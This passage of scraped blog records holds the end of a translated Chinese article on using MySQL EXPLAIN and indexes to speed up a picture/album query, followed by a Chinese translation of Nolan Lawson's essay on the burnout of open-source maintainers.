data-line=\"crayon-594bd575f0b1e558678855-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd575f0b1e558678855-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd575f0b1e558678855-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd575f0b1e558678855-1\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">picture</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">picture</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">title</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd575f0b1e558678855-2\"> <span class=\"crayon-i\">FROM</span> <span class=\"crayon-i\">picture</span></div><div class=\"crayon-line\" id=\"crayon-594bd575f0b1e558678855-3\"> <span class=\"crayon-i\">LEFT</span> <span class=\"crayon-i\">JOIN</span> <span class=\"crayon-i\">album</span> <span class=\"crayon-i\">ON</span> <span class=\"crayon-v\">picture</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">album</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">album</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">id</span> <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-v\">album</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>结果是对数据访问过程的解析。每行代表一个查询相关的数据表：<img title=\"An explanation of how data is accessed\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/ec8027ae03fe43fb6cc2b8fd31cad241.png\" alt=\"An explanation of how data is accessed\" width=\"700\" height=\"95\"></p>\n<p>重点是表名、使用的key、查询执行时所扫描的行数。<img title=\"The important pieces here are the table name, the key used, and the number of rows scanned.\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/a56b96248706d91e9179efb1b76fa54a.png\" alt=\"The important pieces here are the table name, the key used, and the number of rows scanned.\" width=\"700\" height=\"109\"></p>\n<p>这个查询扫描了picture表2百万行，对每个picture记录扫描了album表2万行。意味着，该查询实际扫描了album表400亿行。这个过程可以更高效。</p>\n<h2>索引</h2>\n<p>使用索引，可以极大提升性能。比如地址簿中的名字。找一个名字，你可以从头翻到尾，也可以找到相应的字符标签页来快速定位。</p>\n<p>使用索引可以避免无必要的表扫描。比如在<strong>picture.album_id</strong>上添加索引：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd575f0b28469533607\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nALTER TABLE picture ADD INDEX(album_id);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd575f0b28469533607-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd575f0b28469533607-1\"><span class=\"crayon-i\">ALTER</span> <span class=\"crayon-i\">TABLE</span> <span class=\"crayon-i\">picture</span> <span class=\"crayon-i\">ADD</span> <span class=\"crayon-e\">INDEX</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">album_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在执行查询，就不会扫描整个picture列表了。首先，所有的album表会被扫描以找到属于该用户的album，然后，使用<strong>album_id</strong>列索引快速定位对应的picture。扫描的行数减少到了20万，比原始查询快了317倍。</p>\n<p><img title=\"The query is also about 317 times faster than the original.\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/2bd465bc36d78d15022ee192e4297ad6.png\" alt=\"The query is also about 317 times faster than the original.\" width=\"700\" height=\"107\"></p>\n<p>按照以下方式添加索引可以确保两张表都能使用对应键：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd575f0b2c421090402\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nALTER TABLE album ADD INDEX(user_id);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd575f0b2c421090402-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd575f0b2c421090402-1\"><span class=\"crayon-i\">ALTER</span> <span class=\"crayon-i\">TABLE</span> <span class=\"crayon-i\">album</span> <span class=\"crayon-i\">ADD</span> <span class=\"crayon-e\">INDEX</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">user_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img title=\"Make sure that both tables use a key\" src=\"http://jbcdn2.b0.upaiyun.com/2017/05/9b83ba9ee464210cb1d5a0e966041536.png\" alt=\"Make sure that both tables use a key\" width=\"700\" height=\"105\"></p>\n<p>这次，album表不会被全部扫描，通过<strong>user_id</strong>键就可以精确定位相应的album。然后这100个album被扫描后，通过<strong>album_id</strong>键相关的picture也可以快速找到。每张表都用到了一个键进行查询性能优化，结果比原始查询快了380倍。</p>\n<p>但是并不意味着可以随意添加索引，因为索引会导致写数据库用时增长。所以使用索引导致读用时缩短，写用时增长。因此，如果能提升读性能时再添加索引。使用<strong>EXPLAIN</strong>来确认索引是否被查询用到，没有就删除。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111129\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111129votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111129\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/6813e861d7765d2cf8c1f7f313083944.jpg"], "fav_nums": 5, "comment_nums": 0, "create_date": "2017/05/10", "praise_nums": 2}
{"tags": "开源,职场, 3 评论 ", "front_image_path": "full/6d5ab74e9f7db301ffb44a2a9fc3fa10ecc96181.jpg", "title": "做开源项目的维护者，是怎样一种体验？", "url_object_id": "aba75d0a209a06d0a4c9b4ece925dac2", "url": "http://blog.jobbole.com/111153/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://nolanlawson.com/2017/03/05/what-it-feels-like-to-be-an-open-source-maintainer/\">Nolan Lawson</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：热门开源项目的维护者都很不容易的，素不相识的伸手党会因为你没有及时回答问题、没有及时帮他们搜索出他们想要的答案而开骂，开源项目维护者们往往会憋出心理疾病来的。如果你有开源项目，或许已有体会了。<b></b></p>\n<p>Nolan Lawson 是微软 Edge 浏览器 Web 平台的 PM。参与了<a href=\"https://github.com/nolanlawson\" target=\"_blank\">多个开源项目</a>，比如：PouchDB、optimize-js 等。做开源项目的维护者，是怎样一种体验？请看他 7 年的切身体会。</p>\n<hr>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ffimtsod1tj20d007yabc.jpg\"></p>\n<p>几百个人排成一个队伍，候在你家门外。他们耐心等待你去解答问题、听他们的抱怨、回复 Pull Request 和 Feature Request 。</p>\n<p>你想去帮他们所有人，但你一直拖到现在。也许你辛苦工作了一整天，或者你累了，再或者你只是想跟家人和朋友享受周末。</p>\n<p>但你如果登陆 <a href=\"https://github.com/notifications\">github.com/notifications</a>，Notification 会不断提醒有多少人在等着你：</p>\n<p><img class=\"aligncenter size-full wp-image-5587\" src=\"https://nolanwlawson.files.wordpress.com/2017/03/out.png?w=570\" alt=\"screenshot showing 403 unread GitHub notifications\"></p>\n<p>当你设法找到一些空闲时间，你开门迎接第一个人（即处理第一个问题，其中可能包含不止一个人，下同）。他们足够善意；他们想使用你的项目，但在 API 上陷入一些困惑。他们把代码粘贴到 GitHub 评论上，但是忘记了或者不知道怎么格式化代码，结果代码一团糟。</p>\n<p>还好，你编辑了他们的评论以添加代码块，把代码格式化了。但仍有许多代码需要读。</p>\n<p>另外，他们对问题的描述有些让人难以理解。也许英语不是他们的母语，或者他们在书面表达上能力不足。不管怎样，你努力去理解他们提交的文本段落。</p>\n<p>你疲倦地看了一眼，排在队伍后面等待的另外几百个人。你可以花半个小时去理解这第一个人的代码，或者你可以只是浏览一遍然后给出一些教程或者文档的链接，说不定可以帮助他们解决问题。你还愉快地建议他们尝试 Stack Overflow 或者 Slack 。</p>\n<p>第二个人皱着眉头，脸上露出不悦的神情。他们不断抱怨你的项目如何浪费了他们生命中的两小时，因为某个 API 没有宣传中的效果。他说的话很刻薄，让你很不舒服。</p>\n<p>你没有在这个人身上浪费太多时间。你简单地说道，“这是一个开源项目，且由志愿者维护。如果代码中有 Bug，请提交一个可复现的测试案例或者 PR 。”</p>\n<p>第三个人遇到的是一个很常见的错误，解决方法很简单。你之前看到过几次这个错误，但是一时想不起解决方法在哪。Stack Overflow？维基？邮件列表？在谷歌搜索了几分钟后，你粘贴上了一个链接然后关闭了这个 Issue 。</p>\n<p>第四个人是一个定期的贡献者。你从多个社区讨论会和兄弟项目( sibling project )中识出了他们的名字。他们陷在一个十分晦涩的 Issue ，并提交了一个 Pull Request 来解决它。很不幸这个 Issue 很复杂，所以他们的 PR 中包含许多枯燥的段落，来解释问题。</p>\n<p>再一次地，你瞥了一眼还在排队等待的几百号人，你知道这第四个人在他们的解决方案上花了很多工夫，并且可能这个解决方案是合理的。Travis 测试通过，所以你打算只评论句“LGTM”，然后合并掉这个 Pull Request 。</p>\n<p>然而，你之前被这类情况伤过。在过去，你合并了一个 PR 但没有经过充分的评价，最终因为一些你没有预见到的问题，它导致了新的麻烦。也许是测试通过了，但性能下降了 10% 。或者它引发了一个内存泄漏。或者可能这个 PR 让新用户对项目感到困惑，因为它使得 API 看起来过于复杂。</p>\n<p>如果现在你合并了这个 PR，以后可能会有更多的问题，因为你为解决这个人的问题而打断了另一个人的工作流程。所以你把它放在次要位置，等有了更多时间再去处理它。</p>\n<p>第五个人发现了一个新 Bug，但你知道实际上它是兄弟项目中的一个 Bug 。他们说这阻碍了他们启动 App 。你知道这是个大问题，但只是众多问题中的一个，所以你此刻没有时间去修复它。</p>\n<p>你回应道，这看起来是一个真实的问题，但是它更适合在另一个 Repo 中打开。所以你关闭了他们的 Issue，把它复制到了另一个 Repo，然后你添加一个评论提示，在代码中从哪里开始修复它。尽管你怀疑他们实际上会这个做。很少人会。</p>\n<p>第六个人只说道“现在是什么情况/状态？”你不知道他们在谈论什么，所以你看一下上下文。关于项目中的一个长期存在的 Bug，他们在冗长的 GitHub 线程上进行了评论。许多人不同意这个问题目前的解决方案，所以产生了许多讨论。</p>\n<p>在这个特定 Issue 下有超过 20 条评论，要读完并记住，需要花费你很长的时间。所以你仅仅回应道，“对不起，这个 Issue 开放了一段时间了，但还没有人解决它。我们仍试着去理解问题的范围，最好是开一个 Pull Request ！”</p>\n<p>第七个人只是个 GreenKeeper 网站机器人。他们的问题很简单，除了这个特殊的 Repo 中有相当碎片化的测试，且这个测试由于看起来像是谬误的原因失败了，所以你不得不重新测试看是否通过。你重启了这个测试，并试图让自己记住在 Travis 有机会运行后再去观察一下。</p>\n<p>第八个人开了一个 Pull Request，但所在的 Repo 相当活跃，另一个维护者已经做出反馈。你看了一眼线程，你相信其他维护者会处理好，所以你标记它为已读，然后走开继续。</p>\n<p>第九个人遇到的似乎是个 Bug，而你之前也没见过。但不幸的是，他们对“这个问题实际是如何发生的”没有提供足够的细节。是什么浏览器下出现的？哪个 Node 版本？哪个版本的项目？他们用什么代码来复现它？你让他们做出澄清，然后关掉这个标签。</p>\n<h3>问题不断涌进</h3>\n<p>不一会儿，你接待了 10 到 20 个这样的人。仍有 100 多个在排队等待。但此刻你感到精疲力尽；每个人不是抱怨，就是有问题要解答或者是有增强的请求。</p>\n<p>在某种程度上，这些 GitHub 通知就是不断涌出你项目中差的一面。当他们满意你的工作时，就不会有人建立一个 Issue 或 Pull Request。只有当他们发现有所缺失，才会如此。即使你只花了一点时间阅读这些通知，在精神和情感上都是消耗。</p>\n<p>你妻子观察到在例行完这些公事之后你总是暴躁易怒。也许你发现自己总是没缘由地对她厉声呵斥，仅仅是心情不好。她问你：“如果开源工作这么让你愤怒，为什么你还要做它？”你找不到一个好的答案。</p>\n<p>你可以暂停；事实上目前你可能已经有所体会了。在过去，你曾从 GitHub 休假过一两个星期，只为了精神健康。但最后因为有几百个人在耐心等待（你去处理问题），不得不停止休假。</p>\n<p>如果你过去持续跟进 GitHub 通知，你可能每天要处理 20-30 条。相反，你让它们堆积，所以现在攒了几百条。你感到内疚。</p>\n<p>在过去，由于这样或那样的原因，你确实让这些 Issue 堆积。你或许看到一条数个月都没人应答的 Issue 。通常，当你返回找到那个Issue，提出这个 Issue 的人从不回应。或者他们这么回应，“我们放弃了你的项目而用了另一个，这样我的问题就解决了。” 这让你感觉很糟，但你明白他们的挫败感。</p>\n<p>你从经验中得知，对于这些陈旧的 Issue，最实用的回应往往是只说句，“我要关闭这些旧的 Issue，如果这对你仍是个问题，或者你能提供更多的细节，请重新开一个 Issue 。”通常没有人回应。有时候有，也仅是一个愤怒的评论，抱怨怎么让他们等这么久。</p>\n<p>所以现在你想更勤快地处理你的通知收件箱。几百条太多。你渴望这个数字缩减到一百，几十，或者甚至是神话般地清空。所以你奋力前行。</p>\n<h3>吸引新的贡献者</h3>\n<p>在处理完足够多这样的 Issue 后，即使你的收件箱最终被清空，最后可能仍会积压大量的 Bug 和 Pull Request 。标签可以起到作用——例如，你可以把 Issue 标记为“需要复现”或“有测试用例”或者“很赞的首个补丁”。“很赞的首个补丁”尤其有帮助，因为他们常常可以吸引到新的贡献者。</p>\n<p>然而，你发送能吸引到新贡献者的那一类 Issue ，往往是处理起来非常简单的那一类，这一类 Issue 由新的志愿者去记录，比你亲自去做更有价值。你创建了一些这类的 Issue，因为你知道它的价值所在，让新人参与到开源，当这条 Pull Request 的作者告诉你“这是我在开源社区做的第一个贡献。” 你感觉很棒。</p>\n<p>但你知道他们回来的希望很渺茫；通常这些朋友不会成为定期贡献者或维护者。你怀疑是不是你哪里做错了，你在哪方面改进，才能吸引住新的贡献者来帮你减轻负担。</p>\n<p>你有一个项目几乎就是靠自身维持的。你多年没碰了，但有一帮维护者会回应每一个 Issue 和 PR ，所以你不必亲自去。你非常感激这些维护者。但你不知道你做了什么才使得这么多贡献者投入这个项目，而其他项目最后都是你，且只有你自己负责。</p>\n<h3>向前看吧</h3>\n<p>你不愿去创建新项目，因为你知道它只会增加你的维护负担。事实上，这里有一种反效应，你做得越成功，在 GitHub 通知上得到的“惩罚”就越多。</p>\n<p>你仍能回想起这种创建的快感，从零开始写一个新项目以及解决一个之前未解决问题的喜悦。但是现在你开始衡量这种喜悦，因为任何新项目必定会从旧项目中夺走时间。你不知道是否是时候该正式摒弃你的一个旧 Repo，或者<a href=\"http://unmaintained.tech/\">把它标记为 Unmaintained</a>。</p>\n<p>你不知道在你倦怠之前，这样的情况还要持续多久。你曾考虑将开源工作作为你的白天工作，但是自从你和真正从事开源为生的朋友交流后，你知道这通常意味着，让一个特定的开源项目作为你的白天工作。这对你无益，因为你有<a href=\"https://www.npmjs.com/~nolanlawson\">几十个跨越多个领域的项目</a>，这些都在争夺你的时间。</p>\n<p>你最想要的是更多的项目可以自身独立维持，你尝试去遵守所有的<a href=\"https://medium.freecodecamp.com/how-to-attract-new-contributors-to-your-open-source-project-46f8b791d787\">最佳实践</a>：你有 <code>CONTRIBUTING.md </code>和行为指导，你热情地交出拥有的特权，给任何提交高质量 PR 的人。然而每个项目都这么做，也很耗费精力，所有你没有你期望的那样勤奋。</p>\n<p>你也为此感到内疚，因为你知道开源常常被看做是有特权的白人男性（比如你自己）的专属俱乐部。所以你担心你做的还不够，去解决那样的问题。</p>\n<p>更重要的是，你感到内疚：内疚来自于你知道你本可以帮助有些人解决他们的问题，但你让他们的 Issue 在关闭前被无视了好几个月，或者有人在你的 Repo 开了他们第一条 Pull Request，但你没有时间去回应，这可能因此让他们沮丧到永远不想再参与开源。你的内疚是因为你已做的事情，也是因为你没做过的事情，以及因为你没能招募到更多的人分享你的不幸而有负罪感的经历。</p>\n<h3>集中到一起</h3>\n<p>以上我说的一切都是基于我自己的经验。我不能声称自己代表所有开源软件工作者，这是我自己的感觉。</p>\n<p>我从事开源工作已经有很长一段时间了（大约 7 年），我一直不愿去抱怨任何这些牢骚，因为我担心会被理解为是本应了解更多的前辈在这里夸张地发牢骚。毕竟，这种处境不是我自己造成的吗？我可以随时离开 GitHub；我没有跟任何人签合约。</p>\n<p>还有，我不该感激吗？我从事的开源工作帮助我在社区树立了地位。我获得了在会议做演讲的邀请。在 Twitter 上我有几千号粉丝，他们倾听我的想法，并对我的意见给予很高的评价。可以说，我得到微软的工作是因为我的开源经历。我还有什么可抱怨的？</p>\n<p>然而，我知道许多其他处在与我同样位置的人都已倦怠。伙伴们也都曾热情地合并 Pull Request ，处理 Issue，写博客展示他们的项目，之后就消失得无影无踪。对于其中有些人，我甚至不愿在他们的 Repo 中开 Issue 。因为我知道他们不会回应，我不反对他们，但我担心自己会变成他们一样。</p>\n<p><img class=\"aligncenter\" src=\"https://nolanwlawson.files.wordpress.com/2015/04/20150402203104-cropped.jpg?w=200&amp;h=255\" alt=\"Nolan Lawson - photo of me\" width=\"200\" height=\"255\"></p>\n<p style=\"text-align: center;\">（作者：Nolan Lawson）</p>\n<p>我已经采取了大量的自我保护措施。我不再使用 Github 通知接口——我使用电子邮件过滤器，这样我可以基于项（Unmaintained 这一类可以忽略）或者通知的类别（提到过的或者我评论过的线程通常会有优先权）来分类通知。因为是电子邮件，这也有助于我离线工作和在同一处管理事务。</p>\n<p>我常常会出乎意料地收到在项目上请求支持的邮件，而这个项目我停止维护已经很久了（例如<a href=\"https://github.com/nolanlawson/catlog\">这个项目</a>，我仍至少每月会收到一封），而通常我都是不回应。我还选择忽视我博文下的评论，不回应 Stack Overflow 的回答和邮件列表下的问题。我还积极地取消关注了那些我认为其他人维护得足够好的 Repo 。</p>\n<p>这种情况如此令人沮丧的另一个原因是，你越来越发现处理 Issue 从项目实际维护中夺去太多时间，换句话说，我通常只有足够读取Issue，然后说“对不起，我此刻没有时间看”的时间。仅仅是回应的行为，就会占据我为开源预留的大部分时间。</p>\n<p><a href=\"https://github.com/blog/2111-issue-and-pull-request-templates\">Issue templates</a>、<a href=\"https://greenkeeper.io/\">GreenKeeper</a>、<a href=\"https://travis-ci.org/\">Travis</a>、<a href=\"https://docs.travis-ci.com/user/common-build-problems/#travis_retry\">travis_retry</a>、<a href=\"http://coveralls.io/\">Coveralls</a>、<a href=\"http://saucelabs.com/\">Sauce Labs</a>… 有太多技术工具可以处理开源维护问题，我很感激有这些工具。如果没有这些自动化工具，我就不可能保持头脑清醒。但在某些时候，你会遇到很多 Issue，它们里面涉及的社会性问题比技术性问题更多。一个人不足以说明。我甚至没有进到<a href=\"http://top%20100%20npm%20maintainers\">前100位 npm 维护者榜单</a>，我就已经累觉不爱了；我无法想象那 100 个人是什么体会。</p>\n<p>我已经告诉我妻子，如果当我们打算开始要孩子，我还是放弃开源工作为好，我觉得自己没有能力兼顾抚养家庭和维护开源项目，我预料到，放弃开源才是我核心问题的解决方案。我只希望它会以一种积极的形式到来，就如开始我人生新的篇章，而不是以一种消极的形式，比如毫不客气地倦怠。</p>\n<h3>最后的一点思考</h3>\n<p>如果读到这里，你对困扰开源社区的问题和潜在的解决方案感兴趣，你可能会想研究下 Nadia Eghbal 的<a href=\"http://www.fordfoundation.org/library/reports-and-studies/roads-and-bridges-the-unseen-labor-behind-our-digital-infrastructure\">《Roads and Bridges》</a>。它可能是对该问题最清晰最深入的分析。</p>\n<p>我也乐于接受建议，尽管我在心中牢记我不愿在开源项目中把金钱和劳动混在一起（也许是出于天真的理想主义）。但我曾在<a href=\"https://vuejs.org/support-vuejs/\">其他项目中</a>看到它是有效的。</p>\n<p>请注意，尽管上文表达了开源消极的一面，但我仍觉得它是我生活里一个有价值的补充，我没有任何后悔。但我希望这篇文章对大家有帮助，让你们看到成为自身成功的牺牲者是什么感受，以及你会因为未完成的工作而感到沉重。</p>\n<p>我从参与开源的经历中学到的一点就是：你参与越多，对你的要求就越多。我意识到这样的问题，并没有解决方法。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/dd708b5011ca615a666a617f958683e8.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/7bd3dbe2e00ad5c5d39167e2fbbc6464.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111153\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111153votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111153\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/4b984c976f6d01d29b5371c01b42b6a1.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Python，数据挖掘        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/paradise_FD\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/paradise_fd/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": 